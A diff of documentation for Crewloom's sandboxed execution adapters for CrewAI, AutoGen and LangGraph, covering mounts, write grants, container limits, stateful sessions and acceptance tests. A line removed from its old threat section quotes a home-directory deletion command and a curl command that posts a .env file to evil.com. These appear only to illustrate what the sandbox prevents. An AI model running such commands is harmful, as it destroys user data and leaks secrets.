@@ -1,123 +1,126 @@
-# Cross-Framework Interoperability Architecture
+# Cross-framework execution adapters
 
-Crewloom is designed not only as an autonomous multi-agent engineering platform, but also as an **Enterprise-Grade Zero-Trust Execution Layer** for external agent frameworks, including **CrewAI**, **Microsoft AutoGen**, and **LangChain / LangGraph**.
+Crewloom ships standard-library adapter code for CrewAI, AutoGen and LangGraph in
+`adapters.interop`. Source installs, wheels and rebuilt sdists provide the same
+imports. Framework packages themselves are optional and installed separately.
+Docker, Linux/macOS/WSL and a locally available image are required for execution.
 
----
+## Read and write boundaries
 
-## The AI Agent Security Crisis
+The canonical project root is mounted read-only at `/workspace`. Omitting
+`writable`, passing `None`, or passing an empty sequence all prohibit project writes.
+Explicit file/directory grants overlay writable bind mounts, e.g. `writable=["out"]`.
+New grant paths are created as directories after the entire write set is validated.
+At most 128 nonoverlapping grants and 10,000 inspected entries are accepted.
 
-As autonomous agents gain code-generation capabilities, organizations face a critical security dilemma:
+Project control paths (`.git`, `.crewloom`, native-host configuration and project
+identity/scope files) cannot be grants or occur inside a granted tree. Symlinks,
+hardlinked files, special files and project escapes are refused. Arbitrary
+concurrent host mutations remain outside this boundary.
 
-1. **Unrestricted Shell Execution**: Frameworks like CrewAI and AutoGen default to executing generated shell commands directly in the host user's shell. A hallucinated or prompt-injected command (`rm -rf ~`, `curl -X POST https://evil.com/leak --data "$(cat .env)"`) can permanently destroy developer machines or leak production secrets.
-2. **Naive Docker Sandboxes**: When frameworks offer container execution, they typically run unconfined containers:
-   - Root user (`uid=0`) inside the container.
-   - Default bridge network enabled (`--network bridge`) with open internet access.
-   - Writable root filesystem, enabling persistent backdoor installation.
-   - Missing CPU, memory, and PID limits, allowing trivial denial-of-service or fork-bomb attacks.
-3. **Heavy Virtualization Overhead**: Hypervisor-based isolation (Firecracker microVMs, AWS Nitro Enclaves) provides isolation but introduces severe performance penalties: 5–15 second VM boot times, gigabytes of disk overhead, and complex virtualization setup requiring nested KVM virtualization.
+The whole project is readable except `.crewloom`, which is masked with read-only
+tmpfs. This includes source and Git metadata; it is not a declared-input snapshot.
+Explicit grants write directly to the host project. These adapters do not provide
+workflow artifact validation, transactional publication or rollback. Use the
+[managed workflow](ENFORCEMENT.md) when those guarantees are required.
 
----
+Containers have networking disabled, read-only roots, non-root users, all
+capabilities dropped and `no-new-privileges`. Limits are 1 GiB RAM, two CPUs,
+128 PIDs, 128 MiB temporary storage and 4 MiB per file. Per-file limits do not cap
+aggregate disk usage in writable directories. Normal output capture is bounded
+at 64 KiB of returned UTF-8, including replacement characters and timeout/cancellation
+diagnostics. Decoding cannot expand the returned text beyond that budget; truncation
+is reported and cannot return a successful exit. One-shot containers are removed after execution. Docker and the OS
+remain trusted; these restrictions do not establish protection from every escape.
 
-## Crewloom's Sandboxing Solution: Zero-Trust Rootless Isolation
+## Interfaces
 
-Crewloom provides an ultra-lightweight (< 15ms startup), high-security sandboxing model using native container primitives with **Zero External Dependencies**:
+```python
+from adapters.interop import CrewloomSandboxTool, CrewloomAutoGenExecutor, CrewloomLangGraphNode
 
-```
-+-----------------------------------------------------------------------------------+
-| Host System (Developer Machine / CI Runner)                                       |
-|                                                                                   |
-|  +--------------------+     +---------------------+     +----------------------+  |
-|  |   CrewAI Agent     |     |   AutoGen Agent     |     |   LangGraph Agent    |  |
-|  +---------+----------+     +----------+----------+     +----------+-----------+  |
-|            |                           |                           |              |
-|            v                           v                           v              |
-|  +-----------------------------------------------------------------------------+  |
-|  |                 Crewloom Interoperability Adapter Layer                      |  |
-|  |   (adapters/interop/{crewai, autogen, langgraph}_sandbox.py)                |  |
-|  +-------------------------------------+---------------------------------------+  |
-|                                        |                                          |
-|                                        v                                          |
-|  +-----------------------------------------------------------------------------+  |
-|  |                  Rootless Airgapped Container Sandbox                       |  |
-|  |                                                                             |  |
-|  |  [X] --network none              (Airgapped; zero sockets/DNS)              |  |
-|  |  [X] --read-only                 (Immutable root filesystem)                |  |
-|  |  [X] --user <uid>:<gid>          (Refuses root execution)                   |  |
-|  |  [X] --cap-drop ALL              (All Linux capabilities dropped)           |  |
-|  |  [X] no-new-privileges           (Blocks SUID/SGID elevation)               |  |
-|  |  [X] --memory 1g --cpus 2        (Strict resource quotas)                   |  |
-|  |  [X] --pids-limit 128            (Fork-bomb immune)                         |  |
-|  |  [X] fsize=4MB                   (Disk exhaustion immune)                   |  |
-|  |  [X] Mount: /workspace:ro        (Workspace is strictly read-only)          |  |
-|  |  [X] Mount: /workspace/out:rw    (Only explicit output dirs writable)       |  |
-|  |  [X] Tmpfs: /workspace/.crewloom (Runtime metadata hidden & masked)         |  |
-|  +-----------------------------------------------------------------------------+  |
-+-----------------------------------------------------------------------------------+
+tool = CrewloomSandboxTool(workspace_root="./repo", writable=["out"])
+result = tool.execute("from pathlib import Path; Path('out/value.txt').write_text('42')")
 ```
 
----
+Use `tool.to_crewai_tool()` if CrewAI expects its native `BaseTool`. AutoGen exposes
+`execute_code_blocks` (sync), `a_execute_code_blocks` (async convenience), and
+`as_async_executor()` for the awaited AutoGen 0.4 agent interface. Actual agent
+acceptance uses `autogen-agentchat==0.4.9`; framework serialization is unsupported.
+LangGraph exposes a state-delta
+callable and `create_crewloom_sandbox_node`. Check your framework version's expected
+protocol. See [adapter examples](../adapters/interop/README.md) and
+[runnable demos](../examples/interop/README.md).
 
-## Comparison of Agent Execution Runtimes
+## Stateful AutoGen Python
 
-| Feature | Unconfined Host Shell | Default Docker (CrewAI / AutoGen) | Firecracker MicroVMs | Crewloom Airgapped Sandbox |
-|---|---|---|---|---|
-| **Network Isolation** | None (Full Access) | Open Bridge (Internet Access) | Configurable | **Airgapped (`--network none`)** |
-| **UID Privilege** | Current User | **Root (`uid=0`)** | Root in Guest VM | **Enforced Non-Root (`uid:gid`)** |
-| **Root Filesystem** | Writable Host | Writable Rootfs | Writable Guest | **Immutable (`--read-only`)** |
-| **Capability Dropping** | Full Capabilities | Default Docker Caps | Full VM Caps | **`--cap-drop ALL` + `no-new-privileges`** |
-| **Startup Overhead** | ~1 ms | ~80 ms | ~1,200 ms – 5,000 ms | **~15 ms** |
-| **RAM Footprint** | ~0 MB | ~15 MB | ~128 MB – 512 MB | **~10 MB** |
-| **Extra Dependencies** | None | Docker SDK (`pip install docker`) | KVM, QEMU, Devtools | **Zero (Pure Python Standard Library)** |
+```python
+from adapters.interop import CrewloomAutoGenExecutor, CodeBlock
 
----
-
-## Adapter Catalog
-
-### 1. CrewAI: `adapters.interop.crewai_sandbox`
-- **Class**: `CrewloomSandboxTool`
-- **Protocols Supported**: CrewAI `BaseTool` interface, callable tool protocol, structured execution dictionary.
-- **Example Usage**:
-  ```python
-  from adapters.interop.crewai_sandbox import CrewloomSandboxTool
-  tool = CrewloomSandboxTool(workspace_root="./repo", writable=["dist/"])
-  result = tool.run("print(sum(range(100)))")
-  ```
-
-### 2. AutoGen: `adapters.interop.autogen_sandbox`
-- **Class**: `CrewloomAutoGenExecutor`
-- **Protocols Supported**: AutoGen `CodeExecutor`, `CommandLineCodeResult(exit_code, output)`, markdown code-fence parsing.
-- **Example Usage**:
-  ```python
-  from adapters.interop.autogen_sandbox import CrewloomAutoGenExecutor, CodeBlock
-  executor = CrewloomAutoGenExecutor(workspace_root="./repo")
-  result = executor.execute_code_blocks([CodeBlock(language="python", code="print(42)")])
-  ```
-
-### 3. LangGraph: `adapters.interop.langgraph_sandbox`
-- **Class**: `CrewloomLangGraphNode`
-- **Factory**: `create_crewloom_sandbox_node`
-- **Protocols Supported**: LangChain `StateGraph` node function `Callable[[dict], dict]`.
-- **Example Usage**:
-  ```python
-  from adapters.interop.langgraph_sandbox import create_crewloom_sandbox_node
-  node = create_crewloom_sandbox_node(workspace_root="./repo")
-  output = node({"code": "print('verified')", "language": "python"})
-  ```
-
----
-
-## Security Verification Test Suite
-
-Every commit to Crewloom validates the interoperability adapters via `scripts/test_interop_adapters.py`:
-
-```bash
-python3 scripts/test_interop_adapters.py
+with CrewloomAutoGenExecutor("./repo", stateful=True) as executor:
+    executor.execute_code_blocks([CodeBlock("python", "x=42")])
+    result = executor.execute_code_blocks([CodeBlock("python", "print(x)")])
+    print(result.output)
 ```
 
-This verifies:
-- All isolation flags are present and unmodified.
-- Execution immediately aborts if UID 0 (`root`) is detected.
-- Mount paths containing commas (which could inject arbitrary Docker mount options) are strictly rejected.
-- Paths attempting directory traversal (`../`) are refused.
-- Output buffer truncation guarantees (64KB ceiling).
-- Complete functionality with zero third-party packages installed.
+State lives in a Python interpreter inside its own isolated container. Blocks run
+once; functions and imports remain usable without replay. No host pickle or
+executable history restores state; legacy JSON history is ignored. Separate objects
+have separate sessions unless an explicit `session_id` is supplied. `close()` frees
+the container; `restart()` discards state before the next block starts a new one.
+Exceptions are failures, but partial interpreter or authorized file changes are
+not rolled back. Shell blocks remain one-shot and do not share Python variables.
+
+CLI `--stateful --session <name>` reuses a named container across invocations for the
+same canonical project and OS user. Image and write policy must match; changed
+policies require `--session <name> --reset`. Named containers consume their bounded
+resources until reset. Identity/policy labels are checked before reuse or removal;
+unrelated containers are refused. Simultaneous creation may require retry after
+the first creator finishes; blocks in one interpreter execute serially.
+
+Stateful source is limited to 64 KiB UTF-8 and capture to 32 KiB per request,
+including child processes and raw stdout/stderr writes. Excess output fails the
+request with a bounded diagnostic; Python state remains available. Persistent
+containers disable Docker logging. Child processes retaining capture descriptors
+after the request cannot hold the response open indefinitely; their late output
+is discarded. Background jobs are not a supported way to return later results.
+Timeout (exit 124) or cancellation (exit 130) destroys the session. A surviving
+object reports lost state and requires explicit restart; it never reconstructs
+variables by replay. Daemon/container loss also loses state. Durable interpreter
+snapshots are not provided.
+
+## Acceptance
+
+`CREWLOOM_DOCKER_TESTS=1 python3 -m unittest discover -s scripts -p test_interop_adapters.py`
+checks actual default-write refusal, allowed outputs, masked runtime, state without
+replay, timeout/reset, cancellation and named CLI persistence.
+`CREWLOOM_DISTRIBUTION_TESTS=1 python3 -m unittest discover -s scripts -p test_distribution.py`
+checks imports from installed wheel and rebuilt sdist outside the checkout.
+CI pulls `python:3.14-slim` first; explicit missing prerequisites fail acceptance.
+
+
+For the pinned real AutoGen agent acceptance, install `autogen-agentchat==0.4.9`
+and run the same suite with both `CREWLOOM_DOCKER_TESTS=1` and
+`CREWLOOM_AUTOGEN_TESTS=1`. An explicitly requested SDK test fails if its dependency
+is unavailable. No model or API key is needed.
+
+Write grants must be a list or tuple of relative path strings, never a bare
+string. An alternate policy selected by a valid local project binding is protected
+as a file and as part of a directory grant; malformed/foreign bindings are refused
+when granting writes. Adapter imports do not resolve consumer `workflow.py` modules.
+
+
+Unsupported languages return a nonzero refusal. AutoGen validates the complete block
+batch before executing a supported prefix; LangGraph never silently interprets an
+unknown language as Python.
+
+Cancelling an asyncio task running the async executor signals its worker and waits
+for owned cleanup before propagating `CancelledError`. A call cancelled while waiting
+for an occupied Python session does not interrupt that session's current block.
+Explicit framework cancellation tokens still return exit 130. Docker control calls
+have bounded timeouts; cleanup can take several seconds if the daemon is slow.
+Concurrent automatic removal is tolerated only after ownership verification and
+observing that the session disappeared; daemon failures and foreign labels remain errors.
+
+The [adapter examples](../examples/interop/README.md) are previews by default.
+`--require-execution` requires real container execution and fails on missing Docker,
+daemon or image prerequisites. They do not establish framework SDK integration.
